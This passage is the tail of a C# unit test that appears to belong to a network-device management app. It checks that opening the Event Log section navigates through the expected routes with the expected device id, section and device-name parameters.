        // The Event log is the Logs page with its Device chip fixed (#125).
        await _vm.OpenSectionCommand.ExecuteAsync(DeviceSectionInfo.For(DeviceSection.EventLog));

        Assert.Equal([Routes.DeviceSection, Routes.DeviceGraphs, Routes.Maintenance, Routes.Logs], _navigation.Visits.Select(v => v.Route));
        Assert.Equal(7, _navigation.Visits[3].Parameters![Routes.DeviceIdParameter]);
        Assert.Equal(DeviceSection.Ports, _navigation.Visits[0].Parameters![Routes.SectionParameter]);
        Assert.Equal("edge-rtr", _navigation.Visits[2].Parameters![Routes.DeviceNameParameter]);
    }
}
